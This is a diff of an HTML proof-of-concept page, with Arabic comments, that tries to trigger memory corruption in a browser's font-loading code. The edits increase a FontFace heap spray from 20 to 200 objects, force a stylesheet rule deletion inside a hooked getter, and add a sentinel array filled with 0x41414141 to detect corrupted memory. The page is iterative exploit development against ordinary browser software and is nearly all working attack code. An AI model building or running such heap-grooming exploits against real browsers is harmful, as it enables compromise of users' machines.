@@ -6,10 +6,13 @@
     </style>
 </head>
 <body>
-    <div id="debug" style="color:blue; font-family:monospace;">Status: Waiting...</div>
+    <div id="debug" style="color:blue; font-family:monospace;">Status: Initializing Monitor...</div>
     <script>
         const debug = document.getElementById('debug');
-        debug.innerText = "Status: Script Started.";
+        const MAGIC = 0x41414141;
+        // الـ Sentinel: مصفوفة نراقبها بحثاً عن أي تغيير غير منطقي
+        let sentinel = new Uint32Array(1024);
+        sentinel.fill(MAGIC);
 
         window.onload = () => {
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
@@ -22,28 +25,36 @@
                 get() {
                     if (!fired && this === A) {
                         fired = true;
-                        debug.innerText = "Status: HOOK TRIGGERED. Spraying memory...";
+                        debug.innerText = "Status: Hooked. Spraying 200 objects...";
                         
-                        // هنا التغيير: تقليل العدد واستخدام setTimeout لمنع الانفجار الفوري
-                        setTimeout(() => {
-                            for(let i=0; i<20; i++) { // خفضنا العدد إلى 20 بدلاً من 500
-                                new FontFace('y'+i, 'local(Helvetica)');
+                        // زيادة الضغط تدريجياً لضمان التصادم
+                        for(let i=0; i<200; i++) { 
+                            new FontFace('y'+i, 'local(Helvetica)');
+                        }
+                        
+                        document.getElementById('s').sheet.deleteRule(0);
+                        document.body.offsetTop;
+                        
+                        // التحقق: هل الـ Sentinel تأثر؟
+                        let corrupted = false;
+                        for(let i=0; i<sentinel.length; i++) {
+                            if(sentinel[i] !== MAGIC) {
+                                corrupted = true;
+                                debug.innerText = "!! CRITICAL: Corruption Detected at index " + i + " Value: " + sentinel[i].toString(16);
+                                break;
                             }
-                            
-                            document.getElementById('s').sheet.deleteRule(0);
-                            document.body.offsetTop;
-                            
-                            debug.innerText = "Status: Grooming complete. Watch for crash.";
-                        }, 10); // 10ms تأخير كافٍ جداً للمتصفح ليحافظ على استقراره
+                        }
                         
+                        if(!corrupted) {
+                            debug.innerText = "Status: Grooming complete. No corruption detected (Need more Spray).";
+                        }
                     }
                     return undefined;
                 }
             });
 
-            debug.innerText = "Status: Loading...";
             document.fonts.load('1em x', 'AB').catch((e) => {
-                debug.innerText = "Status: Finished with error: " + e.message;
+                // Ignore
             });
         };
     </script>
